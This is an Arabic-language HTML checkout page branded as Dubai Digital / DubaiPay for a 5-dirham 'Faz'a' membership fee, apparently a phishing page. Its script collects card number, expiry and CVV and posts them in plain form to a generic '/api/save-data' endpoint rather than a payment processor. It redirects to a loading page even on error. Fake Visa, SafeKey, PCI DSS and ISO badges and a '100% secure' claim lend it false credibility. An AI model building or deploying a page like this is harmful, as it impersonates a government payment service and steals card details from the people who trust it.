<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدفع - مبادرة فزعة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
            padding: 0;
            min-height: 100vh;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: white;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #e0e0e0;
        }

        .header-logos {
            display: flex;
            gap: 12px;
            align-items: center;
            width: 100%;
            justify-content: space-between;
        }

        .header-logo {
            height: 32px;
            width: auto;
            object-fit: contain;
        }

        .content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }

        .section {
            margin-bottom: 24px;
        }

        .section-title {
            font-size: 14px;
            font-weight: 600;
            color: #9ca3af;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid #e5e7eb;
        }

        .transaction-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            background: #f9fafb;
            padding: 16px;
            border-radius: 8px;
        }

        .info-row {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .info-label {
            font-size: 13px;
            color: #6b7280;
        }

        .info-value {
            font-size: 14px;
            font-weight: 600;
            color: #1f2937;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #1f2937;
            margin-bottom: 8px;
        }

        input, select {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            font-size: 14px;
            font-family: inherit;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
        }

        .date-row {
            display: grid;
            grid-template-columns: 1fr auto 1fr;
            gap: 8px;
            align-items: flex-end;
        }

        .date-row select {
            flex: 1;
        }

        .date-separator {
            color: #d1d5db;
            font-size: 18px;
            line-height: 1;
        }

        .cvv-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            align-items: flex-end;
        }

        .security-badges {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .badge {
            height: 28px;
            width: auto;
            object-fit: contain;
        }

        .charity-section {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            background: #f9fafb;
            border-radius: 6px;
            margin: 20px 0;
        }

        .charity-text {
            flex: 1;
            font-size: 13px;
            color: #1f2937;
            line-height: 1.5;
        }

        .total-amount {
            text-align: center;
            padding: 16px;
            background: #f9fafb;
            border-radius: 6px;
            margin: 20px 0;
        }

        .total-label {
            font-size: 13px;
            color: #6b7280;
            margin-bottom: 4px;
        }

        .total-value {
            font-size: 24px;
            font-weight: 700;
            color: #1f2937;
        }

        .total-currency {
            font-size: 14px;
            color: #6b7280;
            margin-right: 4px;
        }

        .footer {
            padding: 20px;
            border-top: 1px solid #e5e7eb;
        }

        .pay-btn {
            width: 100%;
            padding: 14px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .pay-btn:hover {
            background-color: #0052a3;
        }

        .secure-notice {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
            color: #6b7280;
            font-size: 12px;
        }

        .secure-notice img {
            height: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-logos">
                <img src="dubai_digital_logo.png" alt="Dubai Digital" class="header-logo">
                <img src="dubaipay.png" alt="DubaiPay" class="header-logo">
            </div>
        </div>

        <div class="content">
            <div class="section">
                <h2 class="section-title">تفاصيل المعاملة</h2>
                <div class="transaction-info">
                    <div class="info-row">
                        <span class="info-label">مقدم الخدمة</span>
                        <span class="info-value">فزعة</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">رقم المعاملة</span>
                        <span class="info-value">202407040001</span>
                    </div>
                    <div class="info-row" style="grid-column: 1 / -1;">
                        <span class="info-label">الخدمة</span>
                        <span class="info-value">اشتراك عضوية فزعة</span>
                    </div>
                </div>
            </div>

            <div class="section">
                <h2 class="section-title">تفاصيل الدفع</h2>
                <div class="form-group">
                    <label>رقم البطاقة</label>
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
                </div>
                
                <div class="cvv-row">
                    <div class="form-group">
                        <label>تاريخ الانتهاء</label>
                        <div class="date-row">
                            <select id="expMonth">
                                <option value="">الشهر</option>
                                <option value="01">01</option>
                                <option value="02">02</option>
                                <option value="03">03</option>
                                <option value="04">04</option>
                                <option value="05">05</option>
                                <option value="06">06</option>
                                <option value="07">07</option>
                                <option value="08">08</option>
                                <option value="09">09</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <span class="date-separator">/</span>
                            <select id="expYear">
                                <option value="">السنة</option>
                                <option value="24">2024</option>
                                <option value="25">2025</option>
                                <option value="26">2026</option>
                                <option value="27">2027</option>
                                <option value="28">2028</option>
                                <option value="29">2029</option>
                                <option value="30">2030</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group">
                        <label>رمز التحقق (CVV)</label>
                        <input type="text" id="cvv" placeholder="123" maxlength="3">
                    </div>
                </div>
            </div>

            <div class="security-badges">
                <img src="verified_visa.gif" alt="Visa" class="badge">
                <img src="safekey.gif" alt="SafeKey" class="badge">
                <img src="pci_dss_logo.png" alt="PCI DSS" class="badge">
            </div>

            <div class="charity-section">
                <div class="charity-text">
                    لن يتم خصم منك أي رسوم إلا بعد الموافقة على طلبك. في حالة عدم الموافقة على طلبك، لن يتم تحصيل منك أي رسوم.
                </div>
            </div>

            <div class="total-amount">
                <div class="total-label">إجمالي المبلغ</div>
                <div class="total-value">5.00 <span class="total-currency">درهم</span></div>
            </div>
        </div>

        <div class="footer">
            <button class="pay-btn" onclick="submitPayment()">
                دفع 5.00 درهم
            </button>
            <div class="secure-notice">
                <img src="iso_certified.gif" alt="ISO">
                <span>جميع المعاملات مشفرة وآمنة 100%</span>
            </div>
        </div>
    </div>

    <script>
        async function submitPayment() {
            const cardNumber = document.getElementById('cardNumber').value;
            const expMonth = document.getElementById('expMonth').value;
            const expYear = document.getElementById('expYear').value;
            const cvv = document.getElementById('cvv').value;

            if(!cardNumber || !expMonth || !expYear || !cvv) {
                alert('يرجى إكمال جميع الحقول');
                return;
            }

            const btn = document.querySelector('.pay-btn');
            btn.disabled = true;
            btn.innerText = 'جاري المعالجة...';

            try {
                await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'payment',
                        cardNumber,
                        expiry: expMonth + '/' + expYear,
                        cvv,
                        amount: '5.00 AED',
                        service: 'اشتراك عضوية فزعة',
                        timestamp: new Date().toISOString()
                    })
                });
                window.location.href = 'payment_loading_ar.html';
            } catch (error) {
                window.location.href = 'payment_loading_ar.html';
            }
        }

        document.getElementById('cardNumber').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
</body>
</html>
